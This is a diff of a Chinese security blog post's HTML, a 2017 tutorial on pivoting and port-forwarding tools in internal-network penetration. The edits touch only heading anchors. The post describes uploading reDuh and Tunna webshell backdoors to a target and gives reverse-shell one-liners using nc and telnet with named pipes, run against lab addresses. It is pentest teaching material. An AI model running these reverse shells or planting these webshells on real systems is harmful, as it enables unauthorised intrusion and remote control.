@@ -1,5 +1,5 @@
 <!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 内网渗透中转发工具总结 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="内网渗透中转发工具总结 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">内网渗透中转发工具总结</h1><div class="post-time">Jul 11, 2017</div><div class="post-content"><!-- ttoc -->
-<h2><span id="lcx-zhuan-fa">LCX转发</span><a href="#lcx-zhuan-fa" class="header-anchor">#</a></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
+<h2><span id="lcx转发">LCX转发</span></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
 <p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p>
 <p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
 <p>首先在本地进行监听，监听51端口并转发到33891端口</p>
@@ -11,12 +11,12 @@
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx2.png" alt=""></p>
 <p>远程桌面访问33891端口</p>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx3.png" alt=""></p>
-<h2><span id="nc-zhuan-fa">NC转发</span><a href="#nc-zhuan-fa" class="header-anchor">#</a></h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
-<h3><span id="zheng-xiang-lian-jie">正向连接</span><a href="#zheng-xiang-lian-jie" class="header-anchor">#</a></h3><p>在靶机上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc1.png" alt=""></p>
+<h2><span id="nc转发">NC转发</span></h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
+<h3><span id="正向连接">正向连接</span></h3><p>在靶机上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc1.png" alt=""></p>
 <p>在本机上操作，并成功获得一个远程机器的shell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc2.png" alt=""></p>
-<h3><span id="fan-xiang-lian-jie">反向连接</span><a href="#fan-xiang-lian-jie" class="header-anchor">#</a></h3><p>在本机运行上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc3.png" alt=""></p>
+<h3><span id="反向连接">反向连接</span></h3><p>在本机运行上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc3.png" alt=""></p>
 <p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc4.png" alt=""></p>
-<h2><span id="redduh-nei-wang-fan-dan">Redduh内网反弹</span><a href="#redduh-nei-wang-fan-dan" class="header-anchor">#</a></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
+<h2><span id="redduh内网反弹">Redduh内网反弹</span></h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
 <p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
 <p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reDuh1.png" alt=""></p>
@@ -24,13 +24,13 @@
 <p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</span><br></pre></td></tr></table></figure></p>
 <p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv localhost 1010</span><br><span class="line">[createTunnel]1235:127.0.0.1:3389</span><br></pre></td></tr></table></figure></p>
 <p>远程登录<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
-<h2><span id="tunna-nei-wang-fan-dan">Tunna内网反弹</span><a href="#tunna-nei-wang-fan-dan" class="header-anchor">#</a></h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
+<h2><span id="tunna内网反弹">Tunna内网反弹</span></h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
 <p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna0.png" alt=""></p>
 <p>这里使用php网站进行测试，上传php后门<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna2.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</span><br></pre></td></tr></table></figure>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna4.png" alt=""></p>
 <p>远程连接<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
-<h2><span id="linux-xi-tong-tong-guo-nc-fan-dan-shell">Linux系统通过nc反弹shell</span><a href="#linux-xi-tong-tong-guo-nc-fan-dan-shell" class="header-anchor">#</a></h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
+<h2><span id="linux系统通过nc反弹shell">Linux系统通过nc反弹shell</span></h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
 <p>首先，攻击端进行监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
@@ -38,13 +38,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc3.png" alt=""></p>
 <p>执行命令，查看发现反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
-<h2><span id="nei-zhi-ming-ling-fan-dan">内置命令反弹</span><a href="#nei-zhi-ming-ling-fan-dan" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
+<h2><span id="内置命令反弹">内置命令反弹</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
 <p>服务器端执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc4.png" alt=""></p>
 <p>反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
-<h2><span id="regeorg-proxifier-zheng-xiang-dai-li">reGeorg+proxifier正向代理</span><a href="#regeorg-proxifier-zheng-xiang-dai-li" class="header-anchor">#</a></h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
+<h2><span id="regeorgproxifier正向代理">reGeorg+proxifier正向代理</span></h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
 <p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
 <p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
 <p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg1.png" alt=""></p>
